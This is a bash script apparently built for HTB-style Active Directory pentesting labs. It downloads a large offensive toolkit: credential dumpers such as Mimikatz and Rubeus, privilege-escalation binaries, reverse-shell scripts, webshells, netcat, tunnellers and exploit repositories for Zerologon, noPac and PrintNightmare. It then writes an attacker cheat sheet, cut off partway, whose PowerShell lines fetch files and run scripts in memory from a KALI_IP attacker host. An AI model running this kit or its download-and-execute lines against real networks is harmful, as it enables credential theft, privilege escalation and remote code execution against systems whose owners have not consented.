#!/bin/bash

#=============================================================================
# PAINKILLER - Windows Pentesting Tools Downloader & Transfer Suite
# COMPLETE VERSION - All AD tools from HTB Academy + extras
# All tools + All transfer methods for any foothold scenario
#=============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_TOOLS_DIR="${HOME}/windows-tools"
TOOLS_DIR="${1:-$DEFAULT_TOOLS_DIR}"

# Create base directory FIRST before anything else
mkdir -p "${TOOLS_DIR}" 2>/dev/null

TEMP_DIR="${TOOLS_DIR}/.tmp"
LOG_FILE="${TOOLS_DIR}/download.log"

# Create temp and touch log file
mkdir -p "${TEMP_DIR}" 2>/dev/null
touch "${LOG_FILE}" 2>/dev/null

#=============================================================================
# HELPER FUNCTIONS
#=============================================================================

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Write to log file if it exists
    [ -f "${LOG_FILE}" ] && echo "${timestamp} [${level}] ${message}" >> "${LOG_FILE}" 2>/dev/null
    
    case "$level" in
        "INFO")   echo -e "${GREEN}[+]${NC} ${message}" ;;
        "WARN")   echo -e "${YELLOW}[!]${NC} ${message}" ;;
        "ERROR")  echo -e "${RED}[-]${NC} ${message}" ;;
        "DEBUG")  echo -e "${BLUE}[*]${NC} ${message}" ;;
        "HEADER") echo -e "\n${PURPLE}[===]${NC} ${message}" ;;
    esac
}

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██╗███╗   ██╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗      ║
║  ██╔══██╗██╔══██╗██║████╗  ██║██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗     ║
║  ██████╔╝███████║██║██╔██╗ ██║█████╔╝ ██║██║     ██║     █████╗  ██████╔╝     ║
║  ██╔═══╝ ██╔══██║██║██║╚██╗██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗     ║
║  ██║     ██║  ██║██║██║ ╚████║██║  ██╗██║███████╗███████╗███████╗██║  ██║     ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     ║
║                                                                               ║
║  Windows Pentesting Arsenal - Download + Transfer Suite                       ║
║  COMPLETE EDITION • All AD Tools • All Transfer Methods                       ║
╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

check_dependencies() {
    log "HEADER" "Checking Dependencies"
    
    local deps=("curl" "wget" "git" "unzip" "jq")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "WARN" "Missing: ${missing[*]}"
        log "INFO" "Installing..."
        sudo apt-get update -qq 2>/dev/null
        sudo apt-get install -y -qq "${missing[@]}" 2>/dev/null
    fi
    
    log "INFO" "Dependencies OK"
}

create_directories() {
    log "HEADER" "Creating Directory Structure"
    
    local dirs=(
        "binaries"
        "powershell"
        "bloodhound"
        "privesc"
        "credentials"
        "enumeration"
        "lateral"
        "bypass"
        "tunneling"
        "webshells"
        "transfer"
        "cheatsheets"
        "python-tools"
        "users"
        "exploits"
        "audit"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "${TOOLS_DIR}/${dir}"
    done
    
    log "INFO" "Directories created"
}

download_file() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    if [ -z "$url" ]; then
        return 1
    fi
    
    # Try curl first, then wget
    if curl -sL --connect-timeout 15 --max-time 60 -o "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    if wget -q --timeout=15 -O "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    rm -f "${output}" 2>/dev/null
    log "WARN" "Failed: ${name}"
    return 1
}

# Improved GitHub release function with better regex handling
get_github_release() {
    local repo="$1"
    local pattern="$2"
    local output="$3"
    local name="$4"
    
    local api="https://api.github.com/repos/${repo}/releases/latest"
    local response=$(curl -s "${api}" 2>/dev/null)
    
    # Check if we got a valid response
    if [ -z "$response" ] || echo "$response" | grep -q "Not Found"; then
        log "WARN" "No releases found for ${repo}: ${name}"
        return 1
    fi
    
    # Use grep and sed for more reliable pattern matching
    local url=$(echo "$response" | jq -r ".assets[].browser_download_url" 2>/dev/null | grep -iE "${pattern}" | head -1)
    
    if [ -n "$url" ] && [ "$url" != "null" ] && [ "$url" != "" ]; then
        download_file "$url" "$output" "$name"
    else
        log "WARN" "No matching asset for pattern '${pattern}': ${name}"
        return 1
    fi
}

# Direct download with fallback URLs
download_with_fallback() {
    local name="$1"
    local output="$2"
    shift 2
    local urls=("$@")
    
    for url in "${urls[@]}"; do
        if download_file "$url" "$output" "$name"; then
            return 0
        fi
    done
    
    log "WARN" "All fallback URLs failed: ${name}"
    return 1
}

# Git clone with error handling
git_clone() {
    local repo="$1"
    local dest="$2"
    local name="$3"
    
    if [ -d "${dest}" ]; then
        log "INFO" "${name} (exists)"
        return 0
    fi
    
    if git clone --depth 1 "${repo}" "${dest}" 2>/dev/null; then
        log "INFO" "${name}"
        return 0
    else
        log "WARN" "Failed to clone: ${name}"
        return 1
    fi
}

#=============================================================================
# DOWNLOAD FUNCTIONS
#=============================================================================

download_powershell_scripts() {
    log "HEADER" "Downloading PowerShell Scripts"
    
    local dir="${TOOLS_DIR}/powershell"
    
    # PowerView variants
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" \
        "${dir}/PowerView.ps1" "PowerView.ps1"
    
    download_file "https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1" \
        "${dir}/PowerView-Empire.ps1" "PowerView-Empire.ps1"
    
    # PowerUp
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
        "${dir}/PowerUp.ps1" "PowerUp.ps1"
    
    # PowerUpSQL
    download_file "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1" \
        "${dir}/PowerUpSQL.ps1" "PowerUpSQL.ps1"
    
    # SharpHound PS1
    download_file "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" \
        "${dir}/SharpHound.ps1" "SharpHound.ps1"
    
    # Inveigh
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
        "${dir}/Inveigh.ps1" "Inveigh.ps1"
    
    # Powercat
    download_file "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" \
        "${dir}/powercat.ps1" "powercat.ps1"
    
    # RunasCs
    download_file "https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1" \
        "${dir}/Invoke-RunasCs.ps1" "Invoke-RunasCs.ps1"
    
    # PrivescCheck
    download_file "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" \
        "${dir}/PrivescCheck.ps1" "PrivescCheck.ps1"
    
    # ADRecon
    download_file "https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1" \
        "${dir}/ADRecon.ps1" "ADRecon.ps1"
    
    # Kerberoast
    download_file "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" \
        "${dir}/Invoke-Kerberoast.ps1" "Invoke-Kerberoast.ps1"
    
    # Mimikatz PS
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" \
        "${dir}/Invoke-Mimikatz.ps1" "Invoke-Mimikatz.ps1"
    
    # GPP Password
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" \
        "${dir}/Get-GPPPassword.ps1" "Get-GPPPassword.ps1"
    
    # Invoke-TheHash suite
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1" \
        "${dir}/Invoke-TheHash.ps1" "Invoke-TheHash.ps1"
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" \
        "${dir}/Invoke-SMBExec.ps1" "Invoke-SMBExec.ps1"
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1" \
        "${dir}/Invoke-WMIExec.ps1" "Invoke-WMIExec.ps1"
    
    # Port scan
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1" \
        "${dir}/Invoke-Portscan.ps1" "Invoke-Portscan.ps1"
    
    # JAWS
    download_file "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
        "${dir}/jaws-enum.ps1" "jaws-enum.ps1"
    
    # Sherlock (old but gold)
    download_file "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" \
        "${dir}/Sherlock.ps1" "Sherlock.ps1"
    
    # nishang shells
    download_file "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" \
        "${dir}/Invoke-PowerShellTcp.ps1" "Invoke-PowerShellTcp.ps1"
    download_file "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1" \
        "${dir}/Invoke-PowerShellTcpOneLine.ps1" "Invoke-PowerShellTcpOneLine.ps1"
    
    # ===== NEW ADDITIONS =====
    
    # DomainPasswordSpray
    download_file "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1" \
        "${dir}/DomainPasswordSpray.ps1" "DomainPasswordSpray.ps1"
    
    # LAPSToolkit
    download_file "https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1" \
        "${dir}/LAPSToolkit.ps1" "LAPSToolkit.ps1"
    
    # Invoke-ACLPwn
    download_file "https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1" \
        "${dir}/Invoke-ACLPwn.ps1" "Invoke-ACLPwn.ps1"
    
    # ASREPRoast
    download_file "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1" \
        "${dir}/ASREPRoast.ps1" "ASREPRoast.ps1"
    
    # GPPAutoPwn
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1" \
        "${dir}/Get-GPPAutologon.ps1" "Get-GPPAutologon.ps1"
    
    # Invoke-SessionGopher
    download_file "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" \
        "${dir}/SessionGopher.ps1" "SessionGopher.ps1"
}

download_binaries() {
    log "HEADER" "Downloading Binaries"
    
    local bin="${TOOLS_DIR}/binaries"
    local priv="${TOOLS_DIR}/privesc"
    local cred="${TOOLS_DIR}/credentials"
    local enum="${TOOLS_DIR}/enumeration"
    local bh="${TOOLS_DIR}/bloodhound"
    local tun="${TOOLS_DIR}/tunneling"
    local lat="${TOOLS_DIR}/lateral"
    local audit="${TOOLS_DIR}/audit"
    
    # GhostPack binaries
    log "DEBUG" "Downloading GhostPack..."
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
        "${cred}/Rubeus.exe" "Rubeus.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" \
        "${enum}/Seatbelt.exe" "Seatbelt.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" \
        "${priv}/SharpUp.exe" "SharpUp.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe" \
        "${cred}/SharpDump.exe" "SharpDump.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SafetyKatz.exe" \
        "${cred}/SafetyKatz.exe" "SafetyKatz.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe" \
        "${lat}/SharpWMI.exe" "SharpWMI.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe" \
        "${cred}/SharpDPAPI.exe" "SharpDPAPI.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" \
        "${enum}/Certify.exe" "Certify.exe"
    
    # Privilege Escalation
    log "DEBUG" "Downloading PrivEsc tools..."
    get_github_release "itm4n/PrintSpoofer" "PrintSpoofer64.exe" "${priv}/PrintSpoofer64.exe" "PrintSpoofer64"
    get_github_release "itm4n/PrintSpoofer" "PrintSpoofer32.exe" "${priv}/PrintSpoofer32.exe" "PrintSpoofer32"
    get_github_release "BeichenDream/GodPotato" "GodPotato-NET4.exe" "${priv}/GodPotato.exe" "GodPotato"
    get_github_release "antonioCoco/RoguePotato" "RoguePotato.zip" "${TEMP_DIR}/RoguePotato.zip" "RoguePotato"
    
    # SweetPotato - CCob/SweetPotato has NO releases, use precompiled from other sources
    log "DEBUG" "Downloading SweetPotato (using precompiled source)..."
    download_with_fallback "SweetPotato.exe" "${priv}/SweetPotato.exe" \
        "https://github.com/uknowsec/SweetPotato/raw/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe" \
        "https://github.com/Tycx2ry/SweetPotato_CS/raw/main/SweetPotato.exe"
    
    # winPEAS/linPEAS - Use direct /latest/download/ URLs (most reliable)
    log "DEBUG" "Downloading PEAS suite..."
    download_with_fallback "winPEAS.exe" "${priv}/winPEAS.exe" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
    
    download_with_fallback "winPEAS.bat" "${priv}/winPEAS.bat" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"
    
    download_with_fallback "linpeas.sh" "${TOOLS_DIR}/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"
    chmod +x "${TOOLS_DIR}/linpeas.sh" 2>/dev/null
    
    # RunasCs - direct URL
    log "DEBUG" "Downloading RunasCs..."
    download_with_fallback "RunasCs.zip" "${TEMP_DIR}/RunasCs.zip" \
        "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip" \
        "https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip"
    
    # LaZagne - direct URL
    log "DEBUG" "Downloading LaZagne..."
    download_with_fallback "LaZagne" "${cred}/lazagne.exe" \
        "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe" \
        "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" \
        "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.5/LaZagne.exe"
    
    # Mimikatz - direct URL
    log "DEBUG" "Downloading Mimikatz..."
    download_with_fallback "Mimikatz" "${TEMP_DIR}/mimikatz.zip" \
        "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
        "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
    
    # Snaffler - direct URL
    log "DEBUG" "Downloading Snaffler..."
    download_with_fallback "Snaffler" "${enum}/Snaffler.exe" \
        "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe" \
        "https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe"
    
    # SharpHound - direct URLs (multiple sources)
    log "DEBUG" "Downloading SharpHound..."
    download_with_fallback "SharpHound.zip" "${TEMP_DIR}/SharpHound.zip" \
        "https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound-v2.5.11.zip" \
        "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound-v2.0.0.zip" \
        "https://github.com/SpecterOps/SharpHound/releases/download/v2.5.11/SharpHound-v2.5.11.zip" \
        "https://github.com/SpecterOps/SharpHound/releases/download/v2.5.10/SharpHound-v2.5.10.zip"
    
    # Kerbrute - direct URLs
    log "DEBUG" "Downloading Kerbrute..."
    download_with_fallback "kerbrute_linux" "${bin}/kerbrute_linux" \
        "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" \
        "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
    chmod +x "${bin}/kerbrute_linux" 2>/dev/null
    
    download_with_fallback "kerbrute.exe" "${bin}/kerbrute.exe" \
        "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe" \
        "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
    
    # Chisel - direct URLs
    log "DEBUG" "Downloading Chisel..."
    download_with_fallback "chisel_windows" "${TEMP_DIR}/chisel_win.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_windows_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz"
    
    download_with_fallback "chisel_linux" "${TEMP_DIR}/chisel_linux.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
    
    # Ligolo-ng - direct URLs
    log "DEBUG" "Downloading Ligolo-ng..."
    download_with_fallback "ligolo_agent" "${TEMP_DIR}/ligolo_agent.zip" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.7.5_windows_amd64.zip" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.4/ligolo-ng_agent_0.7.4_windows_amd64.zip"
    
    download_with_fallback "ligolo_proxy" "${TEMP_DIR}/ligolo_proxy.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.4/ligolo-ng_proxy_0.7.4_linux_amd64.tar.gz"
    
    # ===== NEW ADDITIONS =====
    
    # Inveigh C# (InveighZero) - direct URLs
    log "DEBUG" "Downloading Inveigh C#..."
    download_with_fallback "Inveigh.exe" "${enum}/Inveigh.exe" \
        "https://github.com/Kevin-Robertson/Inveigh/releases/latest/download/Inveigh.exe" \
        "https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh.exe" \
        "https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.10/Inveigh.exe"
    
    # PingCastle - direct URLs
    log "DEBUG" "Downloading PingCastle..."
    download_with_fallback "PingCastle.zip" "${TEMP_DIR}/PingCastle.zip" \
        "https://github.com/netwrix/pingcastle/releases/latest/download/PingCastle_3.3.0.1.zip" \
        "https://github.com/netwrix/pingcastle/releases/download/3.3.0.1/PingCastle_3.3.0.1.zip" \
        "https://github.com/netwrix/pingcastle/releases/download/3.2.0.1/PingCastle_3.2.0.1.zip"
    
    # Group3r - direct URLs
    log "DEBUG" "Downloading Group3r..."
    download_with_fallback "Group3r.exe" "${audit}/Group3r.exe" \
        "https://github.com/Group3r/Group3r/releases/latest/download/Group3r.exe" \
        "https://github.com/Group3r/Group3r/releases/download/1.0.0/Group3r.exe"
    
    # ADExplorer (Sysinternals)
    log "DEBUG" "Downloading Sysinternals tools..."
    download_file "https://download.sysinternals.com/files/AdExplorer.zip" "${TEMP_DIR}/ADExplorer.zip" "ADExplorer"
    
    # Extract archives
    log "DEBUG" "Extracting archives..."
    [ -f "${TEMP_DIR}/RoguePotato.zip" ] && unzip -q -o "${TEMP_DIR}/RoguePotato.zip" -d "${priv}/" 2>/dev/null
    [ -f "${TEMP_DIR}/RunasCs.zip" ] && unzip -q -o "${TEMP_DIR}/RunasCs.zip" -d "${lat}/" 2>/dev/null
    [ -f "${TEMP_DIR}/mimikatz.zip" ] && unzip -q -o "${TEMP_DIR}/mimikatz.zip" -d "${cred}/mimikatz/" 2>/dev/null
    [ -f "${TEMP_DIR}/SharpHound.zip" ] && unzip -q -o "${TEMP_DIR}/SharpHound.zip" -d "${bh}/" 2>/dev/null
    [ -f "${TEMP_DIR}/chisel_win.gz" ] && gunzip -c "${TEMP_DIR}/chisel_win.gz" > "${tun}/chisel.exe" 2>/dev/null
    [ -f "${TEMP_DIR}/chisel_linux.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux.gz" > "${tun}/chisel_linux" 2>/dev/null && chmod +x "${tun}/chisel_linux"
    [ -f "${TEMP_DIR}/ligolo_agent.zip" ] && unzip -q -o "${TEMP_DIR}/ligolo_agent.zip" -d "${tun}/" 2>/dev/null
    [ -f "${TEMP_DIR}/ligolo_proxy.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_proxy.tar.gz" -C "${tun}/" 2>/dev/null
    [ -f "${TEMP_DIR}/PingCastle.zip" ] && unzip -q -o "${TEMP_DIR}/PingCastle.zip" -d "${audit}/PingCastle/" 2>/dev/null
    [ -f "${TEMP_DIR}/ADExplorer.zip" ] && unzip -q -o "${TEMP_DIR}/ADExplorer.zip" -d "${enum}/" 2>/dev/null
    
    # Sysinternals
    download_file "https://download.sysinternals.com/files/PSTools.zip" "${TEMP_DIR}/PSTools.zip" "PSTools"
    [ -f "${TEMP_DIR}/PSTools.zip" ] && unzip -q -o "${TEMP_DIR}/PSTools.zip" -d "${lat}/" 2>/dev/null
    
    download_file "https://download.sysinternals.com/files/AccessChk.zip" "${TEMP_DIR}/accesschk.zip" "AccessChk"
    [ -f "${TEMP_DIR}/accesschk.zip" ] && unzip -q -o "${TEMP_DIR}/accesschk.zip" -d "${priv}/" 2>/dev/null
    
    # Netcat
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" "${lat}/nc64.exe" "nc64.exe"
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc.exe" "${lat}/nc.exe" "nc.exe"
    
    # SharpView
    download_file "https://github.com/tevora-threat/SharpView/raw/master/Compiled/SharpView.exe" \
        "${enum}/SharpView.exe" "SharpView.exe"
}

copy_kali_tools() {
    log "HEADER" "Copying Kali Built-in Tools"
    
    local lat="${TOOLS_DIR}/lateral"
    local cred="${TOOLS_DIR}/credentials"
    local ps="${TOOLS_DIR}/powershell"
    
    # Netcat
    [ -f "/usr/share/windows-resources/binaries/nc.exe" ] && \
        cp "/usr/share/windows-resources/binaries/nc.exe" "${lat}/nc_kali.exe" && log "INFO" "nc.exe (kali)"
    
    # plink
    [ -f "/usr/share/windows-resources/binaries/plink.exe" ] && \
        cp "/usr/share/windows-resources/binaries/plink.exe" "${lat}/plink.exe" && log "INFO" "plink.exe"
    
    # wget
    [ -f "/usr/share/windows-resources/binaries/wget.exe" ] && \
        cp "/usr/share/windows-resources/binaries/wget.exe" "${TOOLS_DIR}/transfer/wget.exe" && log "INFO" "wget.exe"
    
    # Mimikatz
    [ -f "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" ] && \
        cp "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" "${cred}/mimikatz64_kali.exe" && log "INFO" "mimikatz64"
    [ -f "/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe" ] && \
        cp "/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe" "${cred}/mimikatz32_kali.exe" && log "INFO" "mimikatz32"
    
    # PowerSploit
    [ -f "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1" ] && \
        cp "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1" "${ps}/PowerView_kali.ps1" && log "INFO" "PowerView (kali)"
    [ -f "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1" ] && \
        cp "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1" "${ps}/PowerUp_kali.ps1" && log "INFO" "PowerUp (kali)"
    
    # Webshells
    local web="${TOOLS_DIR}/webshells"
    [ -d "/usr/share/webshells" ] && cp -r /usr/share/webshells/* "${web}/" 2>/dev/null && log "INFO" "webshells"
    [ -d "/usr/share/seclists/Web-Shells" ] && cp -r /usr/share/seclists/Web-Shells/* "${web}/" 2>/dev/null
}

clone_python_tools() {
    log "HEADER" "Cloning Python Tools"
    
    local py="${TOOLS_DIR}/python-tools"
    
    # Original tools
    git_clone "https://github.com/fortra/impacket.git" "${py}/impacket" "impacket"
    git_clone "https://github.com/dirkjanm/BloodHound.py.git" "${py}/BloodHound.py" "BloodHound.py"
    git_clone "https://github.com/ly4k/Certipy.git" "${py}/certipy" "certipy"
    git_clone "https://github.com/topotam/PetitPotam.git" "${py}/petitpotam" "petitpotam"
    git_clone "https://github.com/p0dalirius/Coercer.git" "${py}/coercer" "coercer"
    git_clone "https://github.com/dirkjanm/krbrelayx.git" "${py}/krbrelayx" "krbrelayx"
    git_clone "https://github.com/dirkjanm/PKINITtools.git" "${py}/pkinittools" "pkinittools"
    git_clone "https://github.com/ropnop/windapsearch.git" "${py}/windapsearch" "windapsearch"
    
    # ===== NEW ADDITIONS =====
    
    # Responder
    git_clone "https://github.com/lgandx/Responder.git" "${py}/Responder" "Responder"
    
    # enum4linux-ng
    git_clone "https://github.com/cddmp/enum4linux-ng.git" "${py}/enum4linux-ng" "enum4linux-ng"
    
    # noPac (CVE-2021-42278 & CVE-2021-42287)
    git_clone "https://github.com/Ridter/noPac.git" "${py}/noPac" "noPac"
    
    # PrintNightmare (CVE-2021-1675)
    git_clone "https://github.com/cube0x0/CVE-2021-1675.git" "${py}/PrintNightmare" "PrintNightmare"
    
    # adidnsdump
    git_clone "https://github.com/dirkjanm/adidnsdump.git" "${py}/adidnsdump" "adidnsdump"
    
    # gpp-decrypt (Python version)
    git_clone "https://github.com/t0thkr1s/gpp-decrypt.git" "${py}/gpp-decrypt" "gpp-decrypt"
    
    # NetExec (CrackMapExec successor)
    git_clone "https://github.com/Pennyw0rth/NetExec.git" "${py}/NetExec" "NetExec"
    
    # Zerologon
    git_clone "https://github.com/dirkjanm/CVE-2020-1472.git" "${py}/zerologon" "zerologon"
    
    # GetADUsers
    git_clone "https://github.com/ropnop/go-windapsearch.git" "${py}/go-windapsearch" "go-windapsearch"
    
    # ldapdomaindump
    git_clone "https://github.com/dirkjanm/ldapdomaindump.git" "${py}/ldapdomaindump" "ldapdomaindump"
    
    # mitm6
    git_clone "https://github.com/dirkjanm/mitm6.git" "${py}/mitm6" "mitm6"
    
    # Pre-Windows 2000 Computers
    git_clone "https://github.com/garrettfoster13/pre2k.git" "${py}/pre2k" "pre2k"
}

clone_wordlists() {
    log "HEADER" "Cloning Wordlists & Username Lists"
    
    local users="${TOOLS_DIR}/users"
    
    # Statistically Likely Usernames
    git_clone "https://github.com/insidetrust/statistically-likely-usernames.git" \
        "${users}/statistically-likely-usernames" "statistically-likely-usernames"
    
    # SecLists usernames (subset)
    mkdir -p "${users}/common" 2>/dev/null
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt" \
        "${users}/common/names.txt" "names.txt"
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt" \
        "${users}/common/xato-usernames.txt" "xato-usernames.txt"
    
    log "INFO" "Username wordlists ready"
}

#=============================================================================
# TRANSFER METHODS & BYPASS SCRIPTS
#=============================================================================

create_transfer_scripts() {
    log "HEADER" "Creating Transfer Scripts"
    
    local trans="${TOOLS_DIR}/transfer"
    
    cat > "${trans}/TRANSFER-METHODS.md" << 'EOF'
# 🚀 FILE TRANSFER METHODS - ALL SCENARIOS

## 📁 YOUR ATTACKER IP (replace KALI_IP)
```bash
export KALI=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
echo "Your IP: $KALI"
```

---

## 🌐 SCENARIO 1: HTTP SERVER (Most Common)

### Attacker - Start Server
```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# PHP
php -S 0.0.0.0:80

# Ruby
ruby -run -ehttpd . -p80
```

### Target - Download Methods

#### PowerShell
```powershell
# Method 1: Invoke-WebRequest (iwr)
iwr http://KALI_IP/file.exe -OutFile C:\Windows\Temp\file.exe

# Method 2: WebClient
(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','C:\Windows\Temp\file.exe')

# Method 3: DownloadString (memory only)
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/script.ps1')

# Method 4: Invoke-Expression + iwr
IEX(iwr http://KALI_IP/script.ps1 -UseBasicParsing)

# Method 5: Start-BitsTransfer
Start-BitsTransfer -Source "http://KALI_IP/file.exe" -Destination "C:\Windows\Temp\file.exe"

